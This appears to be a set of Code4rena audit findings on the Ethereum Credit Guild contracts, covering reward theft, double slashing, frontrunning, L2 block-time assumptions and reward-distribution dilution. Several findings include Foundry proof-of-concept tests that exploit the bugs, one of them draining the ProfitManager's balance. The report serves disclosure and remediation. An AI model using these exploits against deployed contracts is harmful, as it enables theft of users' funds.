# [H-01] - Incrementing gauge after a positive PnL make it possible to steal rewards of all gauges
https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/ProfitManager.sol#L409-L436
https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/ProfitManager.sol#L416
ttps://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/tokens/GuildToken.sol#L258

## Vulnerability details
Nothing prevent a user to increment a gauge after it has notified a positive PnL, meaning its possible to get rewards even if he never took risk to vote this gauge before.

The scenario is the following:
1) A profit is made
2) Bob had no weight in that gauge
3) Bob see this and incrementGauge (not even need to MEV this into the same block)
4) Bob call claimReward and get a reward

This shouldn't happen this way. What should happen is that user entered after the profit, so he's not entilted to reward right now, but will be for the next profit. 

But something even worse happens: incrementing a gauge after a positive PnL allow the user to steal all profit held by the `ProfitManager`

This happens because of the early return if `_userGaugeWeight == 0` [line 416 in claimGaugeRewards](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/ProfitManager.sol#L416)

What happens is that when Bob increment gauge while having no weight in this gauge, this calls `_incrementGaugeWeight`; which itself [calls claimGaugeRewards before incrementing](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/tokens/GuildToken.sol#L258)

Then, if we go back to claimGaugeRewards code, we see its `_userGaugeProfitIndex` is not updated when his gaugeWeight is 0.
So, when finally he calls himeself `claimGaugeRewards`, his `_userGaugeProfitIndex == 0`, L425 update it to 1e18
And thus `deltaIndex != 0` , allowing him to get a reward he does not deserve.

```solidity
File: src\governance\ProfitManager.sol
409:     function claimGaugeRewards(
410:         address user,
411:         address gauge
412:     ) public returns (uint256 creditEarned) {
413:         uint256 _userGaugeWeight = uint256(			
414:             GuildToken(guild).getUserGaugeWeight(user, gauge)
415:         );
416:         if (_userGaugeWeight == 0) {	//@audit when _incrementGaugeWeight is called, early return
417:             return 0;
418:         }
419:         uint256 _gaugeProfitIndex = gaugeProfitIndex[gauge];
420:         uint256 _userGaugeProfitIndex = userGaugeProfitIndex[user][gauge];
421:         if (_gaugeProfitIndex == 0) {	
422:             _gaugeProfitIndex = 1e18;	//@audit if no profit made, this == 1e18
423:         }
424:         if (_userGaugeProfitIndex == 0) {	//@audit if first claim, user profitIndex = 1e18
425:             _userGaugeProfitIndex = 1e18;
426:         }
427:         uint256 deltaIndex = _gaugeProfitIndex - _userGaugeProfitIndex; //@audit so if a profit is made, this != 0, even if user just entered
428:         if (deltaIndex != 0) {
429:             creditEarned = (_userGaugeWeight * deltaIndex) / 1e18;
430:             userGaugeProfitIndex[user][gauge] = _gaugeProfitIndex;
431:         }
432:         if (creditEarned != 0) {
433:             emit ClaimRewards(block.timestamp, user, gauge, creditEarned);
434:             CreditToken(credit).transfer(user, creditEarned);
435:         }
436:     }
```

If the user have never claimed a reward before, its `_userGaugeProfitIndex` is set to `1e18`, which basically means he was here before the gauge made a any profit, which means he's untilted to the whole profit.


## Impact

User can get undeserved rewards and steal all credit balance held by the `ProfitManager`.

## Proof of Concept


Add this test to `ProfitManager.t.sol` to see that Bob is able to steal the whole `ProfitManager` Credit balance
```solidity
    function test_auditIncrementGaugeAndGetRewardsAfterPnL() public {

		address carol = makeAddr("carol");

		// grant roles to test contract
		vm.startPrank(governor);
		core.grantRole(CoreRoles.GOVERNOR, address(this));
		core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
		core.grantRole(CoreRoles.GUILD_MINTER, address(this));
		core.grantRole(CoreRoles.GAUGE_ADD, address(this));
		core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));
		core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(this));
		vm.stopPrank();

		vm.prank(governor);
		profitManager.setProfitSharingConfig(
			0, // surplusBufferSplit
			0.5e18, // creditSplit
			0.5e18, // guildSplit
			0, // otherSplit
			address(0) // otherRecipient
		);
		guild.setMaxGauges(3);
		guild.addGauge(1, gauge1);
		guild.addGauge(1, gauge2);
		guild.mint(alice, 150e18);
		guild.mint(carol, 150e18);

		vm.startPrank(alice);
		guild.incrementGauge(gauge1, 50e18);
		guild.incrementGauge(gauge2, 50e18);
		vm.stopPrank();

		vm.startPrank(carol);
		guild.incrementGauge(gauge1, 50e18);
		vm.stopPrank();

        // simulate 100e18 total profit
		// 30e18 in gauge1 + 30e18 in gauge2, rest could be from other sources
		credit.mint(address(profitManager), 100e18);
		profitManager.notifyPnL(gauge1, 30e18);
		profitManager.notifyPnL(gauge2, 30e18);

		// ps: because of ProfitSharingConfig set to 50% to creditSplit and 50% guildSplit
		// only half of the profit stays in ProfitManager, the other half is directly transfered to credit holders
		// thus, balance of profitManager is 70e18
		assertEq(credit.balanceOf(address(profitManager)), 70e18);

        // let's move to the next block to shows no need to MEV this
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 13);

		//Bob see's the positive PnL on gauge1 and increment the gauge
		uint256 gaugeToIncrementToGetAllBalance = credit.balanceOf(address(profitManager)) *100 /15 +1; 
		guild.mint(bob, gaugeToIncrementToGetAllBalance);
		vm.prank(bob);
		guild.incrementGauge(gauge1, gaugeToIncrementToGetAllBalance); 

		// Check and assert alice, bob, and carol's pending rewards
		(, uint256[] memory aliceGaugeRewards, /*uint256 aliceTotalRewards*/) = profitManager.getPendingRewards(alice);
		(, uint256[] memory bobGaugeRewards, /*uint256 bobTotalRewards*/) = profitManager.getPendingRewards(bob);
		(, uint256[] memory carolGaugeRewards, /*int256 carolTotalRewards*/) = profitManager.getPendingRewards(carol);

		//pending rewards are greater than profitManager total balance
		assertEq(aliceGaugeRewards[0], 7500000000000000000);
		assertEq(bobGaugeRewards[0], 70000000000000000000);
		assertEq(carolGaugeRewards[0], 7500000000000000000);
		assertEq(
			aliceGaugeRewards[0] + bobGaugeRewards[0] + carolGaugeRewards[0] 
			> credit.balanceOf(address(profitManager))
			, true
		);

		//Bob has cheated, he is able to claim even more than Alice and Carol even though he entered the gauge after the PnL!
		profitManager.claimRewards(bob);
		
		//Alice and Carol cannot claim even if they should
		vm.expectRevert("ERC20: transfer amount exceeds balance");
		profitManager.claimRewards(alice);
		vm.expectRevert("ERC20: transfer amount exceeds balance");
		profitManager.claimRewards(carol);

		// Bob stole all the profitManager balance
		assertEq(credit.balanceOf(bob), 70000000000000000000);
		assertEq(credit.balanceOf(address(profitManager)), 0);
		assertEq(credit.balanceOf(alice), 0);
		assertEq(credit.balanceOf(carol), 0);
    }
```

## Tools Used
Manual review

## Recommended Mitigation Steps

Just remove the unnecessary early return in `claimGaugeRewards`.
All original tests still pass after this change.

```diff
    function claimGaugeRewards(
        address user,
        address gauge
    ) public returns (uint256 creditEarned) {
        uint256 _userGaugeWeight = uint256(
            GuildToken(guild).getUserGaugeWeight(user, gauge)
        );
-        if (_userGaugeWeight == 0) {
-            return 0;
-        }
        uint256 _gaugeProfitIndex = gaugeProfitIndex[gauge];
        uint256 _userGaugeProfitIndex = userGaugeProfitIndex[user][gauge];
        if (_gaugeProfitIndex == 0) {
            _gaugeProfitIndex = 1e18;
        }
        if (_userGaugeProfitIndex == 0) {
            _userGaugeProfitIndex = 1e18;
        }
        uint256 deltaIndex = _gaugeProfitIndex - _userGaugeProfitIndex;
        if (deltaIndex != 0) {
            creditEarned = (_userGaugeWeight * deltaIndex) / 1e18;
            userGaugeProfitIndex[user][gauge] = _gaugeProfitIndex;
        }
        if (creditEarned != 0) {
            emit ClaimRewards(block.timestamp, user, gauge, creditEarned);
            CreditToken(credit).transfer(user, creditEarned);
        }
    }


```


# [H-02] - A user who is slashed while staking, will be slashed again if he restake 
https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/SurplusGuildMinter.sol#L228-L234

## Vulnerability details

In order to get GuildTokens, it is possible for a user to stake its CreditToken into `SurplusGuildMinter`. Staking in this contract imply for the user to transfer an amount of `CreditToken`s to the contract. In exchange, he will get Credit & Guild shares registered to his address for the term/gauge he has chosen to stake into.

For each Guild shares he get, the same amount of GuildToken is minted, these tokens are not transferable, and are automatically put in the term's gauge.
Each time a profit is made, user will see tokens transfered to its address as a reward.
But if a loss occur in the gauge, he will get slashed from all the credit he staked for this gauge.

The issue is there's a bug present in `SurplusGuildMinter::getRewards` which make it possible for the user to get slashed multiple time for the same loss in a gauge.

This function is called by `SurplusGuildMinter::stake` and `SurplusGuildMinter::unstake` at the very beginning of the call in order to apply slashing or distribute rewards before updating the user state.

The issue is [line 229](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/SurplusGuildMinter.sol#L228-L234) : the condition verifying if a user should be slashed will always read an empty `userStake` element, as it declared but still not be writen.
Only afterward, line 234 userStake is written to, but it is too late for the condition to be verified.

```solidity
File: src\loan\SurplusGuildMinter.sol
216:     function getRewards(
217:         address user,
218:         address term
219:     )
220:         public
221:         returns (
222:             uint256 lastGaugeLoss, // GuildToken.lastGaugeLoss(term)
223:             UserStake memory userStake, // stake state after execution of getRewards()
224:             bool slashed // true if the user has been slashed
225:         )
226:     {
227:         bool updateState;
228:         lastGaugeLoss = GuildToken(guild).lastGaugeLoss(term);
229:         if (lastGaugeLoss > uint256(userStake.lastGaugeLoss)) { //@audit-issue H03 - userStake not even yet defined...? always returns 0
230:             slashed = true;									//this means a user can be slashed twice or more
231:         }	//note after a slash, userStake.lastGaugeLoss == 0, thus if condition not verified
232: 
233:         // if the user is not staking, do nothing
234:         userStake = _stakes[user][term]; //@audit-issue H03 should be read before the if condition L229
235:         if (userStake.stakeTime == 0)
236:             return (lastGaugeLoss, userStake, slashed);
237: 
```

## Impact
After being slashed, if a user restake, he will again be slashed on next unstake.

## Proof of Concept

This PoC shows what happens (output below) :

```solidity
    function test_auditUnstakeTwiceSameLoss() public {
        // setup
		SurplusGuildMinter.UserStake memory userStake;

        credit.mint(address(this), 300e18);
        credit.approve(address(sgm), 300e18);
		console.log("\n  0) user starts with a balance of 300e18 credit and no shares");
		console.log("credit shares: %d, guild shares: %d", userStake.credit, userStake.guild);
		console.log("credit.balanceOf: %d", credit.balanceOf(address(this)));

		console.log("\n  1) user stake 150e18 credit ");
        sgm.stake(term, 150e18);
		userStake = sgm.getUserStake(address(this), term);
		console.log("stakeTime: %d, lastGaugeLoss: %d, profitIndex: %d", userStake.stakeTime, userStake.lastGaugeLoss, userStake.profitIndex);
		console.log("credit shares: %d, guild shares: %d", userStake.credit, userStake.guild);
		console.log("credit.balanceOf: %d", credit.balanceOf(address(this)));

        // next block
        vm.warp(block.timestamp + 13);
        vm.roll(block.number + 1);

        // loss in gauge
		console.log("\n  2)notifyPnL is called for a loss");
        profitManager.notifyPnL(term, -27.5e18);

        // cannot stake if there was just a loss
        vm.expectRevert("SurplusGuildMinter: loss in block");
        sgm.stake(term, 10e18);

        // next block
        vm.warp(block.timestamp + 13);
        vm.roll(block.number + 1);

        // cannot stake if loss hasn't been applied afterward
        vm.expectRevert("GuildToken: pending loss");
        sgm.stake(term, 10e18);

		userStake = sgm.getUserStake(address(this), term);
		console.log("stakeTime: %d, lastGaugeLoss: %d, profitIndex: %d", userStake.stakeTime, userStake.lastGaugeLoss, userStake.profitIndex);
		console.log("credit shares: %d, guild shares: %d", userStake.credit, userStake.guild);
		console.log("credit.balanceOf: %d", credit.balanceOf(address(this)));

        // unstake (sgm)
		console.log("\n  3) user try to unstake: he get whiped of his shares and receive nothing >> expected");
        sgm.unstake(term, 123);
		userStake = sgm.getUserStake(address(this), term);
		console.log("stakeTime: %d, lastGaugeLoss: %d, profitIndex: %d", userStake.stakeTime, userStake.lastGaugeLoss, userStake.profitIndex);
		console.log("credit shares: %d, guild shares: %d", userStake.credit, userStake.guild);
		console.log("credit.balanceOf: %d", credit.balanceOf(address(this)));
        // slash sgm
        guild.applyGaugeLoss(term, address(sgm));


        vm.warp(block.timestamp + 13);
        vm.roll(block.number + 1);

		console.log("\n  4) user is stubborn and chose to stake again ");
		sgm.stake(term, 150e18);
		userStake = sgm.getUserStake(address(this), term);
		console.log("stakeTime: %d, lastGaugeLoss: %d, profitIndex: %d", userStake.stakeTime, userStake.lastGaugeLoss, userStake.profitIndex);
		console.log("credit shares: %d, guild shares: %d", userStake.credit, userStake.guild);
		console.log("credit.balanceOf: %d", credit.balanceOf(address(this)));
       
	    // next block
        vm.warp(block.timestamp + 13);
        vm.roll(block.number + 1);

		console.log("\n  5) after some time, no loss occured, he decides to unstake, but get slashed again... he's broke now");
        sgm.unstake(term, 123);
		userStake = sgm.getUserStake(address(this), term);
		console.log("stakeTime: %d, lastGaugeLoss: %d, profitIndex: %d", userStake.stakeTime, userStake.lastGaugeLoss, userStake.profitIndex);
		console.log("credit shares: %d, guild shares: %d", userStake.credit, userStake.guild);
		console.log("credit.balanceOf: %d", credit.balanceOf(address(this)));
    }

```

Output of the test:

```text
[PASS] test_auditUnstakeTwiceSameLoss() (gas: 860859)
Logs:

  0) user starts with a balance of 300e18 credit and no shares
  credit shares: 0, guild shares: 0
  credit.balanceOf: 300000000000000000000

  1) user stake 150e18 credit
  stakeTime: 1679067867, lastGaugeLoss: 0, profitIndex: 0
  credit shares: 150000000000000000000, guild shares: 300000000000000000000
  credit.balanceOf: 150000000000000000000

  2)notifyPnL is called for a loss
  stakeTime: 1679067867, lastGaugeLoss: 0, profitIndex: 0
  credit shares: 150000000000000000000, guild shares: 300000000000000000000
  credit.balanceOf: 150000000000000000000

  3) user unstake: he get whiped of his shares and receive nothing >> expected
  stakeTime: 0, lastGaugeLoss: 0, profitIndex: 0
  credit shares: 0, guild shares: 0
  credit.balanceOf: 150000000000000000000

  4) user is stubborn and chose to stake again
  stakeTime: 1679067893, lastGaugeLoss: 1679067880, profitIndex: 0
  credit shares: 150000000000000000000, guild shares: 300000000000000000000
  credit.balanceOf: 0

  5) after some time, no loss occured, he decides to unstake, but get slashed again... he s broke now
  stakeTime: 0, lastGaugeLoss: 0, profitIndex: 0
  credit shares: 0, guild shares: 0
  credit.balanceOf: 0
```

## Tools Used
Manual audit

## Recommended Mitigation Steps

Update `userStake` before reading it (as otherwise it is only declared and all its values are zero)

```diff
@@ -226,12 +226,12 @@ contract SurplusGuildMinter is CoreRef {
     {
         bool updateState;
         lastGaugeLoss = GuildToken(guild).lastGaugeLoss(term);
+        userStake = _stakes[user][term];
         if (lastGaugeLoss > uint256(userStake.lastGaugeLoss)) {
             slashed = true;
         }

         // if the user is not staking, do nothing
-        userStake = _stakes[user][term];
         if (userStake.stakeTime == 0)
             return (lastGaugeLoss, userStake, slashed);
```

# [M-02] - It is possible to frontrun notifyPnL when a profit occurs to unfairly get rewards
https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/ProfitManager.sol#L409-L436

## Vulnerability details
Users capable of frontrunning can increment the profitable gauge right before notifyPnL is called, and get rewards without taking risk into the protocol gauge voting system.

## Impact
Unfair reward distribution, which would 

## Proof of Concept
This happens because there is no snapshot of gauge weight, allowing anyone to increment gauge before in the same block (and right before) the positive PnL is notified and get rewarded.

```solidity
    function test_auditIncrementGaugeBeforePnLByFrontrun() public {

		// grant roles to test contract
		vm.startPrank(governor);
		core.grantRole(CoreRoles.GOVERNOR, address(this));
		core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
		core.grantRole(CoreRoles.GUILD_MINTER, address(this));
		core.grantRole(CoreRoles.GAUGE_ADD, address(this));
		core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));
		core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(this));
		vm.stopPrank();

		vm.prank(governor);
		profitManager.setProfitSharingConfig(
			0, // surplusBufferSplit
			0.5e18, // creditSplit
			0.5e18, // guildSplit
			0, // otherSplit
			address(0) // otherRecipient
		);
		guild.setMaxGauges(3);
		guild.addGauge(1, gauge1);
		guild.mint(alice, 150e18);

		vm.startPrank(alice);
		guild.incrementGauge(gauge1, 50e18);
		vm.stopPrank();

        // some time passes with no reward
		// Alice has been taking risk by incrementing this gauge
        vm.roll(block.number + 10000);
        vm.warp(block.timestamp + 130000);

		// the "notifyPnL" tx appears into the mempool, Bob see it and frontrun it with an increment of the gauge
		guild.mint(bob, 200e18);
		vm.prank(bob);
		guild.incrementGauge(gauge1, 200e18); 

		credit.mint(address(profitManager), 100e18);
		profitManager.notifyPnL(gauge1, 30e18);

		( , uint256[] memory aliceGaugeRewards, ) = profitManager.getPendingRewards(alice);
		( , uint256[] memory bobGaugeRewards, ) = profitManager.getPendingRewards(bob);

		//Bob is able to get a bigger share of the rewards even if he didn't take any risks
		assertEq(aliceGaugeRewards[0], 3000000000000000000);
		assertEq(bobGaugeRewards[0], 12000000000000000000);

		profitManager.claimRewards(bob);
		profitManager.claimRewards(alice);
    }
```

## Tools Used
Manual Audit

## Recommended Mitigation Steps
Adding a snapshot/checkpoint mechanism to the gauge system as usually seen in other codebases to prevent frontrun in same block.
Unfortunately, this can add a lot of complexity/changes to the original code, which could bring new bugs.

To reduce the code modification to the minimum, I would suggest to add something like a mapping `gaugeAddedInThisBlock[user][gauge]`, and to substract it from `_userGaugeWeight` in  when calculating rewards for the actual block.
Something like this :

```diff
    function claimGaugeRewards(
        address user,
        address gauge
    ) public returns (uint256 creditEarned) {
        uint256 _userGaugeWeight = uint256(
            GuildToken(guild).getUserGaugeWeight(user, gauge)
-		);
+		- gaugeAddedInThisBlock[user][gauge]);
        if (_userGaugeWeight == 0) {
            return 0;
        }
        uint256 _gaugeProfitIndex = gaugeProfitIndex[gauge];
        uint256 _userGaugeProfitIndex = userGaugeProfitIndex[user][gauge];
        if (_gaugeProfitIndex == 0) {
            _gaugeProfitIndex = 1e18;
        }
        if (_userGaugeProfitIndex == 0) {
            _userGaugeProfitIndex = 1e18;
        }
        uint256 deltaIndex = _gaugeProfitIndex - _userGaugeProfitIndex;
        if (deltaIndex != 0) {
            creditEarned = (_userGaugeWeight * deltaIndex) / 1e18;
            userGaugeProfitIndex[user][gauge] = _gaugeProfitIndex;
        }
        if (creditEarned != 0) {
            emit ClaimRewards(block.timestamp, user, gauge, creditEarned);
            CreditToken(credit).transfer(user, creditEarned);
        }
    }
```


# [M-02] - Hardcoded block.number duration for 7-days Poll Duration Incompatible with Layer 2 Block Times
https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L36
https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/GuildVetoGovernor.sol#L231

## Vulnerability details
The protocol currently has a hardcoded 7-days poll duration based on Ethereum's average 13-second block time. However, this setting is not adaptable to Layer 2 (L2) solutions where block times can sometimes significantly differ. 
For instance, on Optimism, the block time is approximately 2 seconds, which is 6 times faster than Ethereum's Layer 1 (L1). As a result, a poll that is intended to last 7 days on L1 will only last around 1.2 days on Optimism. 
Same for zkSync where its the L2 block.number that is returned, and block. times can vary and be significantly lower. 

## Impact
This issue can severely affect the protocol's functionality on L2 solutions. For example, on Optimism, users would have significantly less time to react and participate in a poll, potentially to unfair outcomes, as offboarding a term and calling all the loans there. 
Additionally, the discrepancy in time calculations can lead to inconsistencies in protocol operations across different networks.

## Proof of Concept

```solidity
File: src\governance\LendingTermOffboarding.sol33:     /// @notice maximum age of polls for them to be considered valid.
34:     /// This offboarding mechanism is meant to be used in a reactive fashion, and
35:     /// polls should not stay open for a long time.
36:     uint256 public constant POLL_DURATION_BLOCKS = 46523; // ~7 days @ 13s/block //@audit-issue M03 -  7 days Poll duration hardcoded for 13s block time, while protocol will be deployed on L2 too
37: 
```

```solidity
File: src\governance\GuildVetoGovernor.sol230:     function votingPeriod() public pure override returns (uint256) {
231:         return 2425847; // ~1 year with 1 block every 13s //@audit M03 - not true on some L2
232:     }
```

## Tools Used
Manual Audit

## Recommended Mitigation Steps

Using block.timestamp instead of block.number is a possibility. Though, this will require to update `ERC20MultiVotes`, as right now, `LendingTermOffboarding` calls `ERC20MultiVotes::getPastVotes` which is based on block.number.

Another solution would be to not hardcode the `POLL_DURATION_BLOCKS` and make it updatable by the governance. This will allow to adapt to potential changes that can happen with updates of the L2, as this already happened with (zkSync)[https://github.com/zkSync-Community-Hub/zksync-developers/discussions/87]



# [L-01] - Reward distribution calendar isn't correctly implemented, and can be disturbed for almost no cost
### Math

https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/tokens/ERC20RebaseDistributor.sol#L363

## Vulnerability details

Everytime `distribute` is called, the remaining distribution is reported to a new calendar of `DISTRIBUTION_PERIOD = 30 days`.

e.g: 
1) 100 tokens are distributed, period 30 days
2) At t=15 days, 50 have been distributed. 
3) If an attacker call distribute(1 wei), OR if a new profit distribution occurs
4) The 50 remaining tokens will be distributed over 30 days and not 15 as expected.

## Impact

The distribution calendar is not being followed.
This will negatively impact users of the protocol, as they cannot correctly forecast/anticipate their incomes, as the distribution calendar will be randomly modified, depending on distribution occuring.

## Proof of Concept

You will find a runnable PoC at the end of the section.

Holders of CreditToken can chose to enter rebase in order to receive rewards. Entering rebase virtually mint shares to rebasers, which are converted back to CreditToken when exiting rebase. The profit distribution increases the share price over time, meaning user will make a profit if share price when exiting is greater than when entering.

ECG current implementation of the reward distribution allow anyone to call the `ERC20RebaseDistributor::distribute`.
This is used by the protocol `ProfitManager` to distribute profit to `CreditToken` holders when a positive PnL is reported.
But actually, anyone can distribute through this function, allowing arbitrary reward distribution (e.g: for marketing purpose).

This process is handled by the `ERC20RebaseDistributor` contract, inherited by `CreditToken`.
The goal of this contract is to distribute a reward over a period of time `DISTRIBUTION_PERIOD = 30 days`. The reward emission rate is handled by on of its functions, `interpolatedValue(InterpolatedValue memory val)`, and an `InterpolatedValue` struct (same name as the function) containing the emission slope information, based on how much reward need to be distributed until when.
This slope will in fact be used to update the `__rebasingSharePrice`, increasing its price over time, hence increasing the value of shares held by rebasers when they exit rebase.

```solidity
File: src\tokens\ERC20RebaseDistributor.sol
099:     struct InterpolatedValue {
100:         uint32 lastTimestamp;
101:         uint224 lastValue;
102:         uint32 targetTimestamp;
103:         uint224 targetValue;
104:     }
```

Each time `distribute` is called, the `InterpolatedValue` struct is updated, and the quantity of token to distribute is integrated into the InterpolatedValue.
But what happens, is that previous value is combined with the new value, and endTimestamp is incremented by `DISTRIBUTION_PERIOD`:

```solidity
File: src\tokens\ERC20RebaseDistributor.sol
360:         // adjust up the balance of all accounts that are rebasing by increasing
361:         // the share price of rebasing tokens
362:         if (_rebasingSupply != 0) {
363:             // update rebasingSharePrice interpolation
364: @>          uint256 endTimestamp = block.timestamp + DISTRIBUTION_PERIOD; //@audit endTimestamp is incremented by 30 days 
365:             uint256 newTargetSharePrice = (amount *
366:                 START_REBASING_SHARE_PRICE +
367:                 __rebasingSharePrice.targetValue *	
368:                 _totalRebasingShares) / _totalRebasingShares;		
369:             __rebasingSharePrice = InterpolatedValue({
370:                 lastTimestamp: SafeCastLib.safeCastTo32(block.timestamp),
371:                 lastValue: SafeCastLib.safeCastTo224(_rebasingSharePrice),
372:                 targetTimestamp: SafeCastLib.safeCastTo32(endTimestamp),
373:                 targetValue: SafeCastLib.safeCastTo224(newTargetSharePrice)
374:             });
```

To verify this behavior, please add this test to ERC20RebaseDistributor.t.sol :

```solidity
    function test_auditExitRebaseRestartsInterpolatedValue() public {
        uint256 distributionAmount = 100;

        token.mint(alice, 100);
        token.mint(bobby, 100);

        vm.prank(bobby);
        token.enterRebase();  // distrubte will not recalculate the share price unless some account is rebasing
        vm.prank(alice);
        token.enterRebase();  // distrubte will not recalculate the share price unless some account is rebasing

        assertEq(token.totalSupply(), 200);
        assertEq(token.nonRebasingSupply(), 0);
        assertEq(token.rebasingSupply(), 200);

        // some distribution amounts will make the division of share price
        // round down some balance, and force to enter into the 'minBalance' confition
        token.mint(address(this), distributionAmount);
        token.approve(address(token), distributionAmount);
        token.distribute(distributionAmount);

        //100 has been distributed in this block, no time has passed
		assertEq(token.pendingDistributedSupply(), 100);

        vm.warp(block.timestamp + token.DISTRIBUTION_PERIOD()/2);

        //half of DISTRIBUTION_PERIOD passed, then only 50 are still pending
		assertEq(token.pendingDistributedSupply(), 50);
        assertEq(token.balanceOf(alice), 125);
        assertEq(token.balanceOf(bobby), 125);

		vm.prank(bobby);
        token.exitRebase();
		//there's still alice rebasing, so distributedSupply is not zero'd
		assertEq(token.pendingDistributedSupply(), 50);

        vm.prank(alice);
        token.exitRebase();
		//now that alice exited rebase, there's à rebasing share, pending distribution is 0
		assertEq(token.pendingDistributedSupply(), 0);

		//now let's make bob enter rebase again to try get the undistributed rewards
		vm.prank(bobby);
        token.enterRebase();
		//but reward are lost now, even if no time has passed.
		assertEq(token.pendingDistributedSupply(), 0);

		//even after the end of DISTRIBUTION_PERIOD nothing is here
        vm.warp(block.timestamp + token.DISTRIBUTION_PERIOD()/2);

        assertEq(token.balanceOf(alice), 125);
        assertEq(token.balanceOf(bobby), 125);

    }
```


## Tools Used
Manual review 

## Recommended Mitigation Steps
There's two possibilities, while the first one would be the best in my opnion, it require more modifications :

**1)** Modify the distribution algorithm. This require to rethink how the `rebasingSharePrice` is calculated. As we showed previously, right now, a new distribution will dillute the previous not finished one with the new one over the next 30 days.
One possible way to fix that (this is a vague description) would be to have for each distribution a unique `InterpolatedValue` struct. Calculating the `rebasingSharePrice` at `t = block.timestamp` would then be done by adding each slope for this `t`.


**2)** Aknowledge that distribution will not be distributed as supposed by the calendar, but at least make ``distribute()`` role-protected in order to disallow bad actors, for almost no cost( 1 wei + gas), to postpone and dilute rewards emission.


